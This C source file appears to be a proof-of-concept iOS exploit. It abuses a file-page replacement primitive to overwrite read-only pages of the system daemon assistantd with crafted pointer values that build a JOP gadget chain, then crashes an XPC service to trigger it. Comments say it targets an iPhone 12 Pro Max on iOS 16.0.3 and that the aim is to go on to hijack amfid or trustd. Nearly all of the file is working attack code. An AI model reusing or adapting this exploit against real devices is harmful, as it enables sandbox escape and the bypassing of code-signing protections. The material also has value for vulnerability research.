#include "iamamfid.h"
#include "write_no_write.h"
#include "helpers.h"

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <mach/mach.h>
#include <unistd.h>
#include <dlfcn.h>

void* file_page(char* path, uint32_t page_offset) {
  int fd = open(path, O_RDONLY);
  if (fd < 0) {
    printf("failed to open file: %s\n", path);
    return NULL;
  }
  
  kern_return_t kr;
  mach_vm_address_t addr = 0;
  kr = mach_vm_allocate(mach_task_self(), &addr, PAGE_SIZE, VM_FLAGS_ANYWHERE);
  if (kr != KERN_SUCCESS) {
    printf("mach_vm_allocate failed\n");
    return NULL;
  }
  
  off_t offset = lseek(fd, page_offset, SEEK_SET);
  if (offset != page_offset) {
    printf("failed to seek the file\n");
  }
  
  ssize_t n_read = read(fd, (void*)addr, PAGE_SIZE);
  if (n_read != PAGE_SIZE) {
    printf("short read\n");
    return NULL;
  }
  
  close(fd);
  
  return (void*)addr;
}

void test_overwrite(void) {
  char* target_path = set_up_tmp_file();
  
  uint64_t* page = file_page(target_path, 0);
  *page = 0x1234123443214321;
  
  replace_file_page(target_path, 0, page);
  
  mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)page, PAGE_SIZE);
  
  page = file_page(target_path, 0x4000);
  *page = 0x1111111111111111;
  
  replace_file_page(target_path, 0x4000, page);
  
  mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)page, PAGE_SIZE);
  
  printf("replaced second page!\n");
}

void free_page(uint8_t* page) {
  mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)page, PAGE_SIZE);
}

void become_amfid(void) {
  // currently very hardcoded for iPhone 12 Pro Max running 16.0.3 which is what I have on my desk
  // at the moment this just demonstrates the ability to JOP in the first target; a real JOP payload isn't finished yet
  // but the idea is to steal a more interesting fd (eg amfid/trustd) and use the write_no_write primitive there
  // for more fun :) (there should be various system services you *can* mess with from inside the app sandbox
  // which execute from somewhere under /System/Library and can read /usr/libexec)
  
  char* assistantd_path = "/System/Library/PrivateFrameworks/AssistantServices.framework/assistantd";

  uint32_t page_offset;
  uint8_t* page;

  
  page_offset = 0x454000;
  page = file_page(assistantd_path, page_offset);
  
  /*
   first target (in _start):
   
   __text:000000010000760C                 ADRP            X8, #classRef_NSMutableArray@PAGE
   __text:0000000100007610                 LDR             X0, [X8,#classRef_NSMutableArray@PAGEOFF]
   __text:0000000100007614                 BL              _objc_alloc_init
   
   that gives us control of X0 and PC
   
   initial gadget:
   sub_10008545C:
     LDP             X2, X8, [X0,#0x28]
     LDR             X1, [X0,#0x20]
     MOV             X3, X8
     LDR             X4, [X3,#0x10]!
     MOV             X0, X8
     BRAA            X4, X3
   
   we control X0; gain control of X1 and X2 (and X0 points to an address we control)

   +0x00 <-- point x0 arg to gadget here
   +0x08
   +0x10
   +0x18 gadget_AUTH_GOT entry; make this skip 4
   +0x20 X1
   +0x28 X2
   +0x30 X0
   +0x38 target_pc this needs addrDiv
   */
  *(uint64_t*)(page+0x1368) = 0x801100000008545C; // +0x18 above -- this is the initial PC - auth a key, rebase addr-div - next:2
  *(uint64_t*)(page+0x1370) = 0x4141414141414141; // +0x20 above -- X1; ignore
  *(uint64_t*)(page+0x1378) = 0xc00800000000015a; // +0x28 above --  bind import 0x15a - auth a key zero context, no addr-div next:1
  *(uint64_t*)(page+0x1380) = 0x0008000000455378; // +0x30 above -- X0 - only rebase, next:1
  *(uint64_t*)(page+0x1388) = 0x811100000000f3b4; // +0x38 above -- skip ahead
  *(uint64_t*)(page+0x1390) = 0x4848484848484848; // +0x40 above --
  *(uint64_t*)(page+0x1398) = 0x8009000044444444; // +0x48 above --
  *(uint64_t*)(page+0x1310) = 0x8009000044444444; // +0x50 above --
  *(uint64_t*)(page+0x1318) = 0x8009000044444444; // +0x58 above --
  
  replace_file_page(assistantd_path, page_offset, page);
  free_page(page);
  
  // X0 is from elsewhere:
  // value read from this address:
  // __objc_classrefs:00000001004ECDA8 classRef_NSMutableArray DCQ _OBJC_CLASS_$_NSMutableArray
  
  // currently:
  // 0x4ecda8 : 0x40080000000007df <bind> ordinal: 0x7df addend: 0x0 next: 0x1
  // want rebase to pointer above
  // 0x4ecdc0 : 0x00080000004f61f0 <rebase> target: 0x4f61f0 next: 0x1
  
  page_offset = 0x4ec000;
  page = file_page(assistantd_path, page_offset);
  
  *(uint64_t*)(page+0x0da8) = 0x0008000000455350;
  
  replace_file_page(assistantd_path, page_offset, page);
  free_page(page);
  
  // for now, just prove that worked:
  
  xpc_crasher("com.apple.assistant.dictation");
}
